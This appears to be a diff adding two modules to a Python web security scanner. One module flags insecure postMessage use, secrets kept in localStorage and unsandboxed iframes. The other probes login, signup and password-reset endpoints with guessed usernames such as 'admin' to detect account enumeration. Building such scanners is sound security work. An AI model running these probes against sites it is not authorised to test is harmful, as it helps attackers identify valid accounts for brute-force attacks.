+# ═══════════════════════════════════════════════════════════════════
+def postmessage_scan(url):
+    if _module_skip("postmessage"): info("Skipping PostMessage/Storage (already done)"); return
+    section("MODULE 77 — PostMessage & BROWSER STORAGE","💬")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    try:
+        r = rget(url, timeout=8)
+        html = r.text
+        js_sources = []
+
+        # Find JS files
+        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I)
+        for js_url in js_urls[:8]:
+            if not js_url.startswith("http"):
+                js_url = base + ("" if js_url.startswith("/") else "/") + js_url
+            try:
+                rj = rget(js_url, timeout=5)
+                js_sources.append((js_url, rj.text))
+            except Exception:
+                pass
+        js_sources.append((url, html))
+
+        for js_url, js_code in js_sources:
+            # 1. PostMessage without origin check
+            if "postMessage" in js_code:
+                has_origin_check = bool(re.search(
+                    r"""addEventListener\s*\(\s*["']message["'].*?\.origin""", js_code, re.S))
+                has_wildcard = "*" in js_code and "postMessage" in js_code
+
+                if has_wildcard and not has_origin_check:
+                    add("postmessage", {
+                        "confirmed": True,
+                        "severity": "High",
+                        "title": "Insecure postMessage — Wildcard Origin (*) Without Validation",
+                        "url": js_url,
+                        "description": (
+                            "CONFIRMED: JavaScript uses postMessage with wildcard origin '*' "
+                            "and no event.origin validation in message listener. "
+                            "Any malicious website can send arbitrary messages to this page, "
+                            "potentially manipulating DOM, stealing data, or executing actions."),
+                        "recommendation": (
+                            "Always validate event.origin in message listeners.\n"
+                            "Fix example:\n"
+                            "  window.addEventListener('message', function(event) {\n"
+                            "    if (event.origin !== 'https://trusted-domain.com') return;\n"
+                            "    // process event.data\n"
+                            "  });"),
+                    })
+                elif "postMessage" in js_code and not has_origin_check:
+                    add("postmessage", {
+                        "confirmed": False,
+                        "severity": "Medium",
+                        "title": "Potential Insecure postMessage — No Origin Validation",
+                        "url": js_url,
+                        "description": (
+                            "postMessage detected but message listener lacks explicit "
+                            "event.origin validation. Manual review recommended."),
+                        "recommendation": "Validate event.origin before processing postMessage data.",
+                    })
+
+            # 2. Sensitive data in localStorage
+            SENSITIVE_PATTERNS = [
+                (r"""localStorage\.setItem\s*\(\s*["'][^"']*(?:token|password|secret|key|auth|session|credential|passwd)[^"']*["']""",
+                 "JWT/Auth token stored in localStorage"),
+                (r"""localStorage\.setItem\s*\(\s*["'][^"']*(?:credit|card|ssn|password|passwd)[^"']*["']""",
+                 "Sensitive PII stored in localStorage"),
+                (r"""sessionStorage\.setItem\s*\(\s*["'][^"']*(?:password|secret|key|token)[^"']*["']""",
+                 "Secret stored in sessionStorage"),
+            ]
+
+            for pattern, label in SENSITIVE_PATTERNS:
+                if re.search(pattern, js_code, re.I):
+                    add("postmessage", {
+                        "confirmed": True,
+                        "severity": "High",
+                        "title": f"Sensitive Data in Browser Storage — {label}",
+                        "url": js_url,
+                        "description": (
+                            f"CONFIRMED: {label} detected in JavaScript. "
+                            "Browser storage (localStorage/sessionStorage) is accessible "
+                            "to any JavaScript on the page — an XSS vulnerability would "
+                            "allow an attacker to steal these values."),
+                        "recommendation": (
+                            "Never store tokens, passwords, or sensitive data in localStorage/sessionStorage.\n"
+                            "Use HttpOnly, Secure cookies for session tokens instead.\n"
+                            "If localStorage is required, encrypt the data first with a server-derived key.\n"
+                            "Fix: Replace localStorage.setItem('token', val) with HttpOnly cookie: "
+                            "Set-Cookie: token=val; HttpOnly; Secure; SameSite=Strict"),
+                    })
+
+            # 3. Cross-origin iframe without sandbox
+            if "iframe" in html.lower():
+                iframes = re.findall(r'<iframe[^>]+>', html, re.I)
+                for iframe in iframes:
+                    has_sandbox = "sandbox" in iframe.lower()
+                    has_allow_scripts = "allow-scripts" in iframe.lower()
+                    src_m = re.search(r'src=["\']([^"\']+)["\']', iframe, re.I)
+                    if src_m and not has_sandbox:
+                        iframe_src = src_m.group(1)
+                        if iframe_src.startswith("http") and parsed.netloc not in iframe_src:
+                            add("postmessage", {
+                                "confirmed": True,
+                                "severity": "Medium",
+                                "title": f"Cross-Origin iframe Without sandbox Attribute",
+                                "url": url,
+                                "description": (
+                                    f"CONFIRMED: Cross-origin iframe loading '{iframe_src[:60]}' "
+                                    "without sandbox attribute. If the framed content is compromised, "
+                                    "it may interact with the parent page via postMessage without restriction."),
+                                "recommendation": (
+                                    "Add sandbox attribute to cross-origin iframes.\n"
+                                    "Fix: <iframe src='...' sandbox='allow-scripts allow-same-origin'></iframe>"),
+                            })
+
+    except Exception as e:
+        warn(f"PostMessage scan error: {e}")
+
+    _module_done("postmessage")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 78 — Account Enumeration (WSTG-IDNT-04)
+# ═══════════════════════════════════════════════════════════════════
+def account_enum_scan(url):
+    if _module_skip("acct_enum"): info("Skipping Account Enumeration (already done)"); return
+    section("MODULE 78 — ACCOUNT ENUMERATION","👤")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    ENUM_PATHS = {
+        "login":    ["/login", "/signin", "/api/login", "/api/auth"],
+        "register": ["/register", "/signup", "/api/register", "/api/signup",
+                     "/account/register", "/users/new"],
+        "forgot":   ["/forgot-password", "/forgot", "/reset-password",
+                     "/api/forgot-password", "/api/reset", "/password/reset"],
+    }
+
+    # Test usernames: one that likely exists, one that certainly doesn't
+    TEST_USERS = {
+        "valid_guess":   ["admin", "administrator", "user", "test", "info", "support"],
+        "invalid_guess": ["ZZZINVALIDUSERXYZ999", "nosuchuser12345xyz"],
+    }
+
+    found = False
+
+    for ep_type, paths in ENUM_PATHS.items():
+        for path in paths:
+            ep = base + path
+            try:
+                r0 = rget(ep, timeout=5)
+                if r0.status_code == 404: continue
+                html = r0.text.lower()
+                if "password" not in html and "email" not in html and "user" not in html:
+                    continue
+            except Exception:
+                continue
+
+            good(f"Testing enumeration at: {ep}")
+
+            # Collect responses for valid vs invalid users
+            responses_valid   = []
+            responses_invalid = []
+
+            field_pairs = [("email","password"),("username","password"),("email","pass")]
+
+            for user_field, pass_field in field_pairs[:2]:
+                for valid_user in TEST_USERS["valid_guess"][:3]:
+                    try:
+                        r = rpost(ep,
+                            data={user_field: valid_user, pass_field: "WRONGPASS_ZZZ"},
+                            timeout=8, allow_redirects=True, verify=False)
+                        responses_valid.append({
+                            "user": valid_user,
+                            "status": r.status_code,
+                            "body": r.text[:500],
+                            "size": len(r.content),
+                        })
+                    except Exception:
+                        pass
+                    time.sleep(0.3)
+
+                for invalid_user in TEST_USERS["invalid_guess"]:
+                    try:
+                        r = rpost(ep,
+                            data={user_field: invalid_user, pass_field: "WRONGPASS_ZZZ"},
+                            timeout=8, allow_redirects=True, verify=False)
+                        responses_invalid.append({
+                            "user": invalid_user,
+                            "status": r.status_code,
+                            "body": r.text[:500],
+                            "size": len(r.content),
+                        })
+                    except Exception:
+                        pass
+                    time.sleep(0.3)
+
+            if not responses_valid or not responses_invalid:
+                continue
+
+            # Compare error messages
+            valid_msgs   = [r["body"].lower() for r in responses_valid]
+            invalid_msgs = [r["body"].lower() for r in responses_invalid]
+
+            # Check for different error text
+            VALID_INDICATORS   = ["wrong password", "incorrect password", "password is incorrect",
+                                   "invalid password", "account found", "password doesn't match"]
+            INVALID_INDICATORS = ["user not found", "account not found", "no account",
+                                   "email not registered", "username not found",
+                                   "doesn't exist", "not registered"]
+
+            valid_has_valid_indicator   = any(any(ind in m for ind in VALID_INDICATORS)   for m in valid_msgs)
+            invalid_has_invalid_indicator = any(any(ind in m for ind in INVALID_INDICATORS) for m in invalid_msgs)
+
+            if valid_has_valid_indicator or invalid_has_invalid_indicator:
+                # Different error messages detected
+                v_sample = responses_valid[0]["body"][:150].strip() if responses_valid else ""
+                i_sample = responses_invalid[0]["body"][:150].strip() if responses_invalid else ""
+                add("acct_enum", {
+                    "confirmed": True,
+                    "severity": "Medium",
+                    "title": f"Account Enumeration via {ep_type.title()} Error Message at {path}",
+                    "url": ep,
+                    "description": (
+                        f"CONFIRMED: Different error messages for valid vs invalid usernames at {path}. "
+                        f"Valid user response: '{v_sample}' "
+                        f"Invalid user response: '{i_sample}' "
+                        "An attacker can identify valid usernames before launching targeted brute-force."),
+                    "recommendation": (
+                        "Return identical error messages for both valid and invalid usernames.\n"
+                        "Fix example:\n"
+                        "  // Always return the same message:\n"
+                        "  return res.status(401).json({error: 'Invalid credentials'});\n"
+                        "  // Never return: 'User not found' or 'Wrong password' separately.\n"
+                        "Also implement account lockout and CAPTCHA after 5 failures.\n"
+                        f"Test with: curl -X POST {ep} -d 'username=admin&password=wrong'"),
+                })
+                vuln(f"Account enumeration at {path} ({ep_type})", "Medium")
+                found = True
+                continue
+
+            # Check for response size difference
+            if responses_valid and responses_invalid:
+                avg_valid   = sum(r["size"] for r in responses_valid) / len(responses_valid)
+                avg_invalid = sum(r["size"] for r in responses_invalid) / len(responses_invalid)
+                if abs(avg_valid - avg_invalid) > 100:
+                    add("acct_enum", {
+                        "confirmed": True,
+                        "severity": "Medium",
+                        "title": f"Account Enumeration via Response Size at {path}",
+                        "url": ep,
+                        "description": (
+                            f"CONFIRMED: Response size differs for valid ({avg_valid:.0f}B) "
+                            f"vs invalid ({avg_invalid:.0f}B) usernames at {path}. "
+                            "Even without different text, size difference reveals valid usernames."),
+                        "recommendation": (
+                            "Pad responses to equal size or use identical templates "
+                            "for both valid and invalid user error responses."),
+                    })
+                    found = True
+
+    if not found:
+        good("No account enumeration vulnerability detected")
+    _module_done("acct_enum")
+
 
 if __name__ == "__main__":
     main()
